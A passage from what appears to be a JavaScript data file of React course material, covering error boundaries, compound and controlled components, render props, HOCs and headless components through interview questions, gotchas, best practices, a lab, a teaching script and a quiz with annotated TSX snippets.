<li><b>Reporting</b>: <code>onError</code> → Sentry (or similar) with the component stack, the route, the user ID and the release. Correlate with the backend: include the <code>X-Request-ID</code> FastAPI returned so you can find the failing request in server logs.</li>
<li><b>Reset strategy</b>: <code>resetKeys</code> tied to the route or entity ID; on reset also reset TanStack Query errors (<code>QueryErrorResetBoundary</code>) or you will just re-render the cached error.</li>
</ul>
<p><b>What goes wrong at scale.</b> Event-handler and async errors silently escaping boundaries (add a global <code>window.addEventListener('unhandledrejection', ...)</code> reporter, and use <code>showBoundary</code> for unexpected ones); boundaries so granular that a broken API shows twenty small error boxes instead of one clear message; compound components whose context value is not memoised, re-rendering large menus on every keystroke; "god components" with 40 props that should have been compound components; polymorphic components whose types make CI type-checking slow; HOC chains in legacy code that hide where props come from (migrate them to hooks incrementally, one HOC at a time).</p>`,
      iq: [
        ["fresher", "What is an error boundary, and what does it not catch?", `<p>A component that catches JavaScript errors thrown while rendering its children (and in lifecycle methods/effects), and shows a fallback UI instead of crashing the whole app. It does <b>not</b> catch errors in event handlers, in async code like <code>setTimeout</code> or promise callbacks, during server rendering, or errors thrown by the boundary itself. A common wrong answer is "it catches all errors in its children", but a <code>throw</code> in an <code>onClick</code> handler bypasses it because no rendering is happening at that moment.</p>`],
        ["fresher", "Why does React prefer composition over inheritance?", `<p>Components are functions of props; you customise them by passing data, <code>children</code> or other elements (slots), and you specialise by wrapping (<code>DangerButton</code> renders <code>Button</code> with a fixed variant). This keeps components decoupled and explicit. Inheritance hierarchies create tight coupling and fragile base classes, and React's team found no case where they were needed. Shared non-visual logic goes into custom hooks.</p>`],
        ["mid", "What is the difference between a controlled and an uncontrolled component API? How do you support both?", `<p>Uncontrolled: the component keeps its own state; the caller sets the initial value with <code>defaultValue</code> and maybe listens with <code>onChange</code>. Controlled: the caller passes <code>value</code> and <code>onChange</code> and owns the state; the component only reports changes. Support both by treating <code>value !== undefined</code> as controlled: use the prop if present, otherwise internal state seeded from <code>defaultValue</code>; always call <code>onChange</code>. Do not sync props into state with an effect (a classic bug: the component and parent drift apart), and warn if the mode switches during the component's lifetime.</p>`],
        ["mid", "How would you implement compound components like <code>&lt;Tabs&gt;&lt;Tabs.Tab /&gt;&lt;Tabs.Panel /&gt;&lt;/Tabs&gt;</code>?", `<p>The parent holds the selected value (controlled or uncontrolled) and provides <code>{ value, select }</code> via context. Each sub-component reads the context with a guard hook that throws if it is used outside <code>&lt;Tabs&gt;</code>. Memoise the context value. Add ARIA roles (<code>tablist</code>, <code>tab</code>, <code>tabpanel</code>, <code>aria-selected</code>, <code>aria-controls</code>) and arrow-key navigation. Tempting alternative: <code>React.Children.map</code> + <code>cloneElement</code>, which breaks as soon as a consumer wraps a tab in another element, since it only sees direct children.</p>`],
        ["mid", "What are render props and HOCs, and why are they less common now?", `<p>A render prop is a function prop that returns UI, letting a component share its state with the caller's rendering (<code>&lt;Mouse&gt;{p =&gt; ...}&lt;/Mouse&gt;</code>). An HOC is a function that takes a component and returns an enhanced one (<code>withAuth(Page)</code>). Both were ways to reuse stateful logic before hooks. Hooks do it without extra tree layers, prop-name collisions or awkward typing. They still appear in libraries: React Hook Form's <code>Controller</code>, React Router's <code>&lt;Await&gt;</code>, Headless UI, <code>memo</code>, MobX <code>observer</code>, <code>withErrorBoundary</code>.</p>`],
        ["senior", "A user reports a blank white page after clicking a button. Your error boundary did not show its fallback. Walk through the diagnosis.", `<p>A blank page means the root unmounted: an <b>uncaught render error</b> above or outside every boundary. Since a click caused it, likely sequence: the handler set state to something invalid (e.g. <code>null</code> where an array is expected), and the <i>next render</i> threw in a component not wrapped by a boundary, or in the boundary's own fallback. If the error were thrown <i>inside</i> the handler, the UI would stay as it was (handler errors do not unmount anything). Check the console and the root's <code>onUncaughtError</code>/Sentry report for the component stack, confirm where boundaries sit, add a root boundary, and fix the state shape. Tempting wrong answer: "the boundary doesn't catch event handler errors, so that's why", which explains a missing fallback but not a blank page.</p>`],
        ["senior", "How do you surface an error from an async event handler in an error boundary?", `<p>Catch it and hand it to React during rendering. With <code>react-error-boundary</code>: <code>const { showBoundary } = useErrorBoundary(); ... catch (e) { showBoundary(e) }</code>. Without the library: store it in state (<code>setError(e)</code>) and <code>if (error) throw error;</code> at the top of render, which then throws during render and is caught. With TanStack Query, <code>throwOnError</code> does this for queries/mutations. In React 19, an error thrown in an action passed to <code>startTransition</code> also reaches the nearest boundary. But first decide whether it should: expected errors (validation, 409) belong in local UI, not a fallback.</p>`],
        ["senior", "What is a headless component and when would you choose one?", `<p>A component or hook that implements behaviour, state, keyboard interaction and ARIA without imposing markup or styles, e.g. Radix Primitives, React Aria, Headless UI, Downshift, TanStack Table. Choose it when you need a custom visual design but do not want to re-implement accessibility for complex widgets (menus, comboboxes, dialogs with focus trapping). Trade-off: more assembly work per use than a fully styled library like MUI, so teams usually wrap headless primitives once in their own design system.</p>`],
        ["lead", "You inherit a <code>&lt;DataTable&gt;</code> with 45 props. How would you redesign its API?", `<p>Identify which props configure <b>behaviour</b> (sorting, pagination, selection) and which configure <b>presentation</b> (cell rendering, header layout, empty state). Move behaviour into a headless hook (or adopt TanStack Table) and expose presentation via composition: compound parts (<code>&lt;DataTable.Toolbar&gt;</code>, <code>&lt;DataTable.Pagination&gt;</code>), slots (<code>emptyState</code>), and column definitions with cell render functions. Make stateful features controllable (<code>sorting</code>/<code>onSortingChange</code>) so they can be tied to URL params and FastAPI query parameters for server-side sorting. Migrate incrementally: build the new API, re-implement the old component on top of it, deprecate props with lint/codemods.</p>`],
        ["architect", "Where would you place error boundaries in a large app, and how do they fit with monitoring?", `<p>Layered: a root boundary (last resort, full-page fallback, reports to Sentry), route-level boundaries (React Router <code>ErrorBoundary</code> per route so navigation still works), and widget-level boundaries around independently failing regions (third-party embeds, charts, user-generated content renderers). Avoid boundaries on every component (noise, fragmented UI). Report with component stack, route, release and the backend request ID for correlation with FastAPI logs. Use <code>createRoot</code>'s <code>onCaughtError</code>/<code>onUncaughtError</code> (React 19) for central reporting, plus <code>window</code> <code>error</code>/<code>unhandledrejection</code> listeners for handler and async errors that boundaries never see. Define a reset policy (route/entity <code>resetKeys</code>, query error reset) and alert on error-rate per release.</p>`]
      ],
      gotchas: [
        `<b>Error boundaries do not catch errors in event handlers or async code.</b> A <code>throw</code> in <code>onClick</code> leaves the UI untouched and logs an uncaught error; an <code>await</code> that rejects in a handler is an unhandled rejection. Use <code>try/catch</code> + local state, or <code>showBoundary</code>.`,
        `<b>A boundary cannot catch its own errors.</b> If the fallback itself throws (e.g. it reads <code>error.message</code> on a non-Error value), the error propagates to the next boundary up, possibly the root, blanking the page. Keep fallbacks trivial.`,
        `<b>A tripped boundary stays tripped.</b> Without a reset (<code>resetKeys</code>, <code>resetErrorBoundary</code>, or a changing <code>key</code> on the boundary) navigating to another item still shows the fallback. With TanStack Query, also reset the query's error state or the retry re-renders the cached error.`,
        `<b>Switching between controlled and uncontrolled</b> (passing <code>value={user?.name}</code> that starts <code>undefined</code>) makes inputs and well-built components change mode mid-life; React warns "A component is changing an uncontrolled input to be controlled". Use <code>value={user?.name ?? ''}</code>.`,
        `<b>Copying a controlled prop into state</b> (<code>useState(props.value)</code>) only uses the first value; later prop changes are ignored. Either be controlled (read the prop) or uncontrolled (name it <code>defaultValue</code>), never both.`,
        `<b>Defining an HOC-wrapped component inside render</b> (<code>const Enhanced = withUser(Profile)</code> in a component body) creates a new component type every render: the subtree remounts and loses state each time. Create HOC results at module scope.`,
        `<b>Dotted compound names (<code>Tabs.Tab</code>) and Server Components:</b> in an RSC app, a client component module's property assignments may not be accessible from a Server Component across the <code>'use client'</code> boundary; many libraries therefore also export flat names (<code>TabsTrigger</code>, <code>TabsContent</code>). Check your framework's behaviour (Day 13).`,
        `<b>Unmemoised context values</b> in compound components re-render every consumer whenever the parent renders, which is noticeable in large menus and tables.`
      ],
      best: [
        `Design APIs around composition: <code>children</code> and slot props for content, compound components for multi-part widgets, a headless hook when consumers need full control of markup.`,
        `Support controlled and uncontrolled modes for stateful components with the conventional names (<code>value</code>/<code>defaultValue</code>/<code>onValueChange</code>, <code>open</code>/<code>defaultOpen</code>/<code>onOpenChange</code>), implemented once in <code>useControllableState</code>.`,
        `Build complex interactive widgets (menus, comboboxes, dialogs, date pickers) on proven headless libraries such as Radix Primitives or React Aria rather than hand-rolling focus and ARIA handling.`,
        `Prefer hooks over render props and HOCs in new code; when an HOC is unavoidable, create it at module scope, set a <code>displayName</code>, and forward unrelated props.`,
        `Place error boundaries at root, route and independent-widget levels; give them a reset strategy and report to monitoring with the component stack and backend request ID.`,
        `Handle expected errors locally with state and messages; send only unexpected ones to boundaries, and add global <code>error</code>/<code>unhandledrejection</code> reporting for handler and async failures.`,
        `Keep presentational components pure and prop-driven; put data access in hooks; let route components be thin glue.`
      ],
      lab: [
        `Build the compound <code>&lt;Tabs&gt;</code> from example 2 in your Vite app. Put a wrapping <code>&lt;span&gt;</code> between two tabs to prove context works at any depth, and check arrow-key navigation and the ARIA attributes in DevTools → Accessibility.`,
        `Add a controlled mode: bind the selected tab to <code>?tab=</code> using React Router's <code>useSearchParams</code>. Refresh the page and confirm the tab is restored. Then use it uncontrolled elsewhere with <code>defaultValue</code>.`,
        `Write <code>useDisclosure</code> with prop getters and build an FAQ accordion from it. Then build a single-open <code>&lt;Accordion&gt;</code> as a compound component with context.`,
        `Implement the class <code>ErrorBoundary</code>, then switch to <code>react-error-boundary</code>. Wrap two dashboard widgets separately and make one throw during render: the other must keep working.`,
        `Add a button that throws in its <code>onClick</code> and confirm the boundary does <i>not</i> show its fallback. Then make an async save to a FastAPI endpoint that returns 500 and forward the error with <code>showBoundary</code>; add a "Try again" that resets via <code>resetKeys</code>.`,
        `<b>Done when:</b> tabs work with mouse and keyboard in both controlled (URL) and uncontrolled modes; the accordion works with your own markup; a render error in one widget shows only that widget's fallback; the onClick error leaves the UI unchanged; and the 500 from the backend shows the boundary fallback with a working retry.`
      ],
      teach: `<p>"Reusable components in React are built by composition, never inheritance. You specialise by wrapping and customise by passing things in: <code>children</code>, other elements as named slots, or functions.</p>
<p>For multi-part widgets like tabs or accordions, use <b>compound components</b>: the parent holds the state and shares it through context, and the pieces read it, so consumers can arrange them however they like. Make stateful components work both <b>uncontrolled</b>, with a <code>defaultValue</code>, and <b>controlled</b>, with <code>value</code> plus <code>onValueChange</code>, so a parent can sync them with the URL or the backend. If teams need total control over markup, go <b>headless</b>: a hook or unstyled component that provides behaviour and accessibility, like Radix or React Aria.</p>
<p>Render props and higher-order components were how we shared logic before hooks; you still meet them in libraries, but new code uses custom hooks.</p>
<p>Finally, <b>error boundaries</b>: still a class component or the <code>react-error-boundary</code> package. They catch errors thrown while rendering their subtree and show a fallback, so one broken widget doesn't blank the page. They don't catch errors in event handlers or async code: handle those yourself or forward them with <code>showBoundary</code>. Put boundaries at the root, per route and around risky widgets, and report what they catch."</p>`
    }
  ],
  quiz: [
    {
      q: `This component works while the user is logged out, then crashes the moment <code>user</code> arrives from <code>/api/me</code>. What error do you see, and what is the fix?`,
      code: `function Header({ user }: { user: { name: string } | null }) {
  if (!user) {
    return <a href="/login">Log in</a>;
  }
  const [menuOpen, setMenuOpen] = useState(false);
  return (
    <button onClick={() => setMenuOpen((o) => !o)}>
      {user.name} {menuOpen ? '▲' : '▼'}
    </button>
  );
}`,
      lang: "tsx",
      ans: `"Rendered more hooks than during the previous render." Move <code>useState</code> above the early return (or split the logged-in part into its own component).`,
      why: `The first render (logged out) calls zero hooks, so the fiber's hook list is empty. The next render calls <code>useState</code>, and React finds no existing node to match it, so it throws. ESLint's <code>react-hooks/rules-of-hooks</code> reports "React Hook useState is called conditionally" before you even run it. An early <code>return</code> is a condition: every hook must run on every render, in the same order. Splitting into <code>&lt;UserMenu user={user} /&gt;</code> is often the cleaner fix, since the menu state then naturally resets on logout.`
    },
    {
      q: `<code>Sidebar</code> and <code>Header</code> both call <code>useCart()</code>. A user clicks "Add" in the sidebar. What does the header show?`,
      code: `function useCart() {
  const [items, setItems] = useState<string[]>([]);
  const add = (sku: string) => setItems((prev) => [...prev, sku]);
  return { items, add };
}

function Sidebar() {
  const { items, add } = useCart();
  return <button onClick={() => add('sku-42')}>Add ({items.length})</button>;
}

function Header() {
  const { items } = useCart();
  return <span>Cart: {items.length}</span>;
}`,
      lang: "tsx",
      ans: `The sidebar shows "Add (1)", the header still shows "Cart: 0". Custom hooks share logic, not state.`,
      why: `Each call to <code>useCart()</code> runs <code>useState</code> on the <i>calling</i> component's fiber, creating a separate piece of state per component. To share the cart, keep the state in one place: lift it into a common parent and pass it down, provide it with context (<code>CartContext</code>), or store it in an external store (Zustand, or a small store read with <code>useSyncExternalStore</code>). If the cart lives on the server, TanStack Query with a shared <code>['cart']</code> key gives every caller the same cached data.`
    },
    {
      q: `The whole page is wrapped in an <code>&lt;ErrorBoundary fallback={&lt;p&gt;Oops&lt;/p&gt;}&gt;</code>. The user clicks "Export" before the report has loaded. What happens?`,
      code: `function ExportButton({ rows }: { rows: unknown[] | null }) {
  function handleExport() {
    // rows is null when the report has not loaded yet
    const csv = rows!.map((r) => JSON.stringify(r)).join('\\n');
    downloadFile(csv);
  }
  return <button onClick={handleExport}>Export</button>;
}`,
      lang: "tsx",
      ans: `The <code>TypeError</code> is <b>not</b> caught by the boundary. No fallback appears; the UI stays as it was and the error shows up as an uncaught error in the console (and in <code>window.onerror</code>).`,
      why: `Error boundaries only catch errors thrown while React is rendering (and in lifecycle methods/effects). An event handler runs later, when the browser dispatches the click, so there is no render to unwind. Fix the bug (disable the button until <code>rows</code> exists), and for unexpected failures in handlers either show local error state or call <code>showBoundary(error)</code> from <code>react-error-boundary</code>'s <code>useErrorBoundary()</code> to route it into the boundary deliberately.`
    },
    {
      q: `This timer shows the elapsed seconds. What does it display after 5 seconds, and why?`,
      code: `function Elapsed() {
  const [seconds, setSeconds] = useState(0);
  useEffect(() => {
    const id = setInterval(() => {
      setSeconds(seconds + 1);
    }, 1000);
    return () => clearInterval(id);
  }, []);
  return <p>{seconds}s</p>;
}`,
      lang: "tsx",
      ans: `It shows "1s" forever.`,
      why: `The interval callback was created during the first render and closed over <code>seconds = 0</code>. The empty dependency array means the effect never re-runs, so every tick computes <code>0 + 1</code>. <code>exhaustive-deps</code> warns about the missing <code>seconds</code>. Best fix here: the updater form <code>setSeconds((s) =&gt; s + 1)</code>, which doesn't need <code>seconds</code> at all. When the callback must read several fresh values, use a <code>useInterval</code> hook that keeps the latest callback in a ref (or <code>useEffectEvent</code> where your React version provides it).`
    },
    {
      q: `A reusable <code>&lt;Accordion&gt;</code> supports <code>open</code>/<code>onOpenChange</code> (controlled) and <code>defaultOpen</code> (uncontrolled), choosing the mode by <code>open !== undefined</code>. A developer reports "it logs a warning and sometimes ignores my state". What is wrong?`,
      code: `function FaqSection({ faq }: { faq: { openId?: string } | undefined }) {
  const [openId, setOpenId] = useState(faq?.openId);
  return <Accordion open={openId} onOpenChange={setOpenId} items={ITEMS} />;
}`,
      lang: "tsx",
      ans: `<code>openId</code> starts as <code>undefined</code>, so the accordion begins <b>uncontrolled</b> and becomes <b>controlled</b> once a string is set: it switches modes mid-life.`,
      why: `With <code>undefined</code> the accordion uses its internal state; after the first change the parent's string takes over, and internal and external state can disagree. React warns about the same thing for native inputs ("changing an uncontrolled input to be controlled"). Fix: pick one mode for the component's lifetime. Either initialise with a defined value meaning "none open" (for example <code>useState&lt;string | null&gt;(faq?.openId ?? null)</code>, if the API treats <code>null</code> as "nothing open"), or drop <code>open</code> and pass <code>defaultOpen</code> only.`
    },
    {
      q: `Which approach would you choose for a design-system <code>&lt;Select&gt;</code> that must match a custom Figma design, support keyboard navigation and screen readers, and be bound to <code>?status=</code> in the URL?`,
      ans: `A headless, accessible primitive (Radix Select, React Aria, or a headless hook) wrapped in your own styled compound component, exposing both <code>value</code>/<code>onValueChange</code> and <code>defaultValue</code>.`,
      why: `A fully styled library fights the custom design; hand-rolling a listbox means re-implementing focus management, typeahead and ARIA semantics, which is where most home-made selects fail accessibility audits. A headless primitive gives the behaviour; your compound wrapper (<code>&lt;Select&gt;&lt;Select.Trigger /&gt;&lt;Select.Content&gt;...</code>) gives the design-system API. Controlled mode lets the page bind it to <code>useSearchParams</code> so the selected status drives the TanStack Query key and the <code>/api/orders?status=</code> request; uncontrolled mode keeps simple uses simple. A render-prop or HOC-based API would be the dated choice here.`
    }
  ]
}
]});
